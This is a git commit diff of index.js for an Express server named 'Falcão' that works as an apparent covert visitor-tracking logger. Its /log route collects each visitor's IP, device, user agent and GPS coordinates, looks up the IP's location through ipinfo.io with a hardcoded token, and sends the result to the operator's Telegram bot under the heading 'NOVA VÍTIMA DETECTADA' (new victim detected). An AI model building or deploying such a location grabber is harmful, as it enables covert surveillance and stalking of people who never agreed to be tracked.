fde39eb245e72a40e568a10c7abdeb77804201f2
João Pedro <123993143+joaopedrolimar@users.noreply.github.com>
2025-04-23 16:16:27 -0400

    a

--- index.js
+++ index.js
@@ -4,43 +4,40 @@ const bodyParser = require('body-parser');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Variáveis do ambiente (.env)
-// Variáveis do ambiente (.env ou Render)
 const botToken = process.env.BOT_TOKEN;
 const chatId = process.env.CHAT_ID;
 
-// Middlewares
 app.use(bodyParser.json());
 app.use(express.static('public'));
 
-// Página inicial
 app.get('/', (req, res) => {
   res.sendFile(__dirname + '/public/index.html');
 });
 
-// Rota que recebe dados do visitante
 app.post('/log', async (req, res) => {
   const data = req.body;
   console.log("📥 Dados recebidos:", data);
+
   if (!botToken || !chatId) {
     console.error("❌ BOT_TOKEN ou CHAT_ID não definidos!");
     return res.status(500).send("Bot não configurado.");
   }
+
   try {
     const ipResponse = await fetch(`https://ipinfo.io/${data.ip}?token=c5633786f81824`);
     const ipInfo = await ipResponse.json();
+
     const mensagem = `
-    📡 NOVA VÍTIMA DETECTADA
-    🧠 ID: ${data.visitorId}
-    🌍 IP: ${data.ip}
-    📍 Localização: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
-    🏢 ISP: ${ipInfo.org}
-    🕵️‍♂️ Agente: ${data.userAgent}
-    📱 Dispositivo: ${data.device}
-    📌 Lat/Long (GPS): ${data.loc || "N/A"}
-    🔗 Lat/Long (IP): ${ipInfo.loc}
-    `;
-    
+📡 NOVA VÍTIMA DETECTADA
+🧠 ID: ${data.visitorId}
+🌍 IP: ${data.ip}
+📍 Localização: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
+🏢 ISP: ${ipInfo.org}
+🕵️‍♂️ Agente: ${data.userAgent}
+📱 Dispositivo: ${data.device}
+📌 Lat/Long (GPS): ${data.loc || "N/A"}
+🔗 Lat/Long (IP): ${ipInfo.loc}
+`;
 
     const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
@@ -50,12 +47,14 @@ app.post('/log', async (req, res) => {
         text: mensagem
       })
     });
+
     const telegramResult = await telegramRes.json();
     if (!telegramResult.ok) {
       console.error("❌ Erro ao enviar pro Telegram:", telegramResult);
     } else {
       console.log("✅ Notificação enviada ao Telegram");
     }
+
     res.sendStatus(200);
   } catch (err) {
     console.error("❌ Erro no processo de rastreamento:", err);
@@ -63,7 +62,6 @@ app.post('/log', async (req, res) => {
   }
 });
 
-// Inicia o servidor
 app.listen(PORT, () => {
   console.log(`🦅 Falcão rodando em: http://localhost:${PORT}`);
 });
